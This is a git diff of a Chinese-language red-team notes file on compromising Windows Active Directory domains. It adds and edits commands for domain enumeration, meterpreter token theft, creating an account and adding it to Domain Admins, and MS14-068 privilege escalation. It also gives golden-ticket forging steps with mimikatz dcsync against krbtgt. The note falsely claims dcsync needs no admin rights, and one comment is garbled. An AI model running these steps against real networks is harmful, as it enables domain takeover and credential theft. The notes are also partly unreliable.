@@ -14,11 +14,11 @@ ping OWA # 域控主机即可获得域控IP
 # 查看所有域成员计算机列表
 net group "domain computers" /domain
 # 查看域管理员, 看到管理员后 meterpreter > ps , migrate xxx 偷令牌
-Net group "domain admins" /domain
+net group "domain admins" /domain
 # 登陆本机的域管理员
 net localgroup administrators /domain
 # 查看域成员 假设域为god
-net view /domain:god
+net view /domain:god  # tode.org则写tide
 # 当前计算机名
 hostname
 # 查看域控列表
@@ -31,6 +31,20 @@ beacon> net dclist
 ```
 sharehound 查看收集的信息
 
+## 域维护命令
+```sh
+
+gpmc.msc # 组策略
+
+net user administrator * # 修改管理员密码
+net user aa pass /add /domain # 添加账户
+net localgroup "domain admins" aa /add /domain # 添加域控管理员
+# net user aa # 查看一下
+net localgroup administrators domain\user /add # 添加用户到管理员
+# 本地登录 .\admin
+klist # 看已有票据
+klist purge # 清空票据
+```
 ## 提权
 ```sh
 wmic qfe get hotfixid | findstr KB3011780 # 无补丁  则 ms14-068 提权
@@ -246,6 +260,30 @@ net use P: \\168.1.1.0\zhq3211
 net use P: /del
 net use P: \\Name\zhq3211
 ```
+
+## 票据
+###  TGT（黄金票据）
+[Link](https://blog.csdn.net/lza20001103/article/details/127113346)
+
+黄金票据影响整个域上的所有服务的
+黄金票据伪造条件
+制作金票的条件：
+
+域名称
+- 域的SID值
+- 域KRBTGT账号密码HASH
+- 伪造用户名，可以是任意的
+- 利用步骤：
+
+域名称 shell whoami
+- 域的SID值 shell whoami /all
+- 域KRBTGT账号密码HASH
+- mimikatz lsadump::dcsync /user:krbtgt@god.org (de1ay.com是一个域名)
+- 这条命令可以是域内的用户就执行的了，不需要管理员权限，我们可以伪造票据，得到域控的权限从而获取整个域内的权限
+
+利用cs内置的模块（黄金票据伪造）
+- 设置伪造的用户，域名称，域SID，域内普通用户的HASH值，进行build
+
 # Article
 
 [域内定位个人PC的三种方式](https://mp.weixin.qq.com/s/uXTo2AbmvMeNesR8rAjImw)
